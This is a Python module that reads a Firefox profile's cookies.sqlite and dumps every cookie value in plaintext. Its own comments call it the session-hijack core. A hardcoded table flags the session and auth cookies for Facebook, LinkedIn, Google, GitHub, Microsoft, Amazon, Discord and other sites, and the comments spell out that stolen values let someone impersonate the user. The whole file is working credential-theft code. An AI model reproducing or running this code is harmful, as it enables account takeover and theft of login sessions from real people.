"""Firefox cookie extraction (the session-hijack core).

Firefox stores every cookie -- including the auth/session tokens for
Facebook, LinkedIn, Google, etc. -- in cookies.sqlite. Unlike Chrome,
the values are stored in PLAINTEXT: no encryption key is involved.

This is the entire point of the technique you're studying: a logged-in
site's auth cookie is a bearer token. Read it off disk and you can replay
that session elsewhere, regardless of the cookie's HttpOnly flag (that
flag only protects against JavaScript stealing it via XSS; it does
nothing against someone who owns the disk).

The dump always happens from a COPY of the database in a temp dir,
because a live browser locks the file (and keeps session-only cookies
in memory until it shuts down).
"""

from __future__ import annotations

import os
import shutil
import sqlite3
import tempfile
from dataclasses import dataclass
from typing import Any

# Maps a site -> the specific cookie names that ARE the session.
# Stealing these = impersonating that user on that site.
HIGH_VALUE_COOKIES: dict[str, set[str]] = {
    "facebook": {
        "c_user",        # Facebook numeric user id
        "xs",            # Facebook session secret (paired with c_user)
        "datr",
        "sb",
        "fr",            # browser_id, used in fraud checks
    },
    "linkedin": {
        "li_at",         # LinkedIn access token (the main session)
        "li_rm",         # remember-me token
        "li_a",
        "li_oat",
    },
    "google": {
        "SID", "HSID", "SSID", "APISID", "SAPISID",
        "LSID", "SIDCC", "SAPISIDHASH",
        "__Secure-1PSID", "__Secure-3PSID", "__Secure-1PSIDCC", "__Secure-3PSIDCC",
    },
    "github": {
        "user_session",
        "__Host-user_session_same_site",
        "dotcom_user",
        "logged_in",
    },
    "instagram": {"sessionid", "rur", "csrftoken", "ds_user_id", "ig_did"},
    "twitter": {"auth_token", "ct0", "twid"},
    "x": {"auth_token", "ct0", "twid"},
    "amazon": {"session-id", "session-token", "ubid-main", "at-main", "x-main"},
    "microsoft": {"ESTSAUTH", "ESTSAUTHPERSISTENT", "MC1", "SigninState"},
    "apple": {"aasp", "aa"},
    "netflix": {"NetflixId", "SecureNetflixId"},
    "reddit": {"token_v2", "session_tracker", "loid"},
    "twitch": {"auth-token", "sp", "persistent"},
    "cloudflare": {"cf_clearance"},  # anti-bot clearance token
    "discord": {"__dcfduid", "sdcfduid", "cf_bm"},
    "spotify": {"sp_dc", "sp_landing", "sp_t"},
    "yahoo": {"Y", "A3", "B"},
}

# Generic auth-cookie names that usually carry session state on any domain.
# Substring match: catches names like "exploit_database_session",
# "wp-session-token", "XSRF-TOKEN", etc.
GENERIC_SESSION_NAMES = {
    "sessionid", "session_id", "session",
    "token", "auth_token", "access_token", "refresh_token", "id_token",
    "credentials", "sso", "auth",
}
_SESSION_SUBSTRINGS = ("session", "token", "auth", "credential", "sso")

# Substrings that mark a host as belonging to a tracked platform.
_SITE_HINTS: list[tuple[str, str]] = [
    ("facebook", "facebook"),
    ("fb.", "facebook"),
    ("linkedin", "linkedin"),
    ("google", "google"),
    ("youtube", "google"),
    ("github", "github"),
    ("instagram", "instagram"),
    ("twitter", "twitter"),
    ("x.com", "x"),
    ("amazon", "amazon"),
    ("microsoft", "microsoft"),
    ("live.com", "microsoft"),
    ("apple", "apple"),
    ("netflix", "netflix"),
    ("reddit", "reddit"),
    ("twitch", "twitch"),
    ("cloudflare", "cloudflare"),
    ("discord", "discord"),
    ("spotify", "spotify"),
    ("yahoo", "yahoo"),
]


@dataclass
class Cookie:
    """One cookie with its session-relevance tags."""

    host: str
    name: str
    value: str
    path: str = "/"
    expiry: int = 0          # 0 / negative = session cookie
    is_secure: bool = False
    is_http_only: bool = False
    same_site: str = ""
    high_value: bool = False
    category: str = ""       # "facebook", "linkedin", ... or "generic"

    def to_dict(self) -> dict[str, Any]:
        return {
            "host": self.host,
            "name": self.name,
            "value": self.value,
            "path": self.path,
            "expiry": self.expiry,
            "expiry_hint": self.expiry_hint(),
            "isSecure": self.is_secure,
            "isHttpOnly": self.is_http_only,
            "sameSite": self.same_site,
            "high_value": self.high_value,
            "category": self.category,
        }

    def expiry_hint(self) -> str:
        if self.expiry <= 0:
            return "session"
        return "persistent"


def classify(host: str, name: str) -> tuple[bool, str]:
    """Return (is_high_value, category) for a (host, name) pair."""
    lowered = host.lower()
    lower_name = name.lower()
    for hint, site in _SITE_HINTS:
        if hint in lowered:
            if name in HIGH_VALUE_COOKIES.get(site, set()):
                return True, site
            break
    if name in GENERIC_SESSION_NAMES or any(s in lower_name for s in _SESSION_SUBSTRINGS):
        return True, "generic"
    return False, ""


def copy_db(profile_path: str) -> str | None:
    """Copy cookies.sqlite (+ its WAL if present) into a temp dir.

    Copying matters for two reasons:
      1. The live browser holds the file open / locked.
      2. WAL data (recent cookie writes) is only in cookies.sqlite-wal;
         copying both lets SQLite replay the WAL on the copy.
    Returns the temp directory holding the copies, or None if the profile
    has never written any cookies (brand-new profile).
    """
    src = os.path.join(profile_path, "cookies.sqlite")
    if not os.path.isfile(src):
        return None
    tmp = tempfile.mkdtemp(prefix="ff-cookies-")
    dst = os.path.join(tmp, "cookies.sqlite")
    shutil.copy2(src, dst)
    wal = os.path.join(profile_path, "cookies.sqlite-wal")
    if os.path.isfile(wal):
        try:
            shutil.copy2(wal, os.path.join(tmp, "cookies.sqlite-wal"))
        except OSError:
            pass  # best-effort; WAL missing just means slightly older dump
    return tmp


def dump_cookies(profile_path: str) -> list[Cookie]:
    """Extract every cookie from a Firefox profile, tagged by session value."""
    tmp = copy_db(profile_path)
    if tmp is None:
        return []  # brand-new profile that never stored cookies
    try:
        db = os.path.join(tmp, "cookies.sqlite")
        conn = sqlite3.connect(f"file:{db}?mode=ro", uri=True)
        conn.row_factory = sqlite3.Row
        try:
            rows = conn.execute(
                "SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite "
                "FROM moz_cookies ORDER BY host, name"
            ).fetchall()
        finally:
            conn.close()

        cookies: list[Cookie] = []
        for r in rows:
            host = r["host"]
            name = r["name"]
            value = r["value"]
            high, cat = classify(host, name)
            cookies.append(
                Cookie(
                    host=host,
                    name=name,
                    value=value,
                    path=r["path"],
                    expiry=r["expiry"],
                    is_secure=bool(r["isSecure"]),
                    is_http_only=bool(r["isHttpOnly"]),
                    same_site=str(r["sameSite"]),
                    high_value=high,
                    category=cat,
                )
            )
        return cookies
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
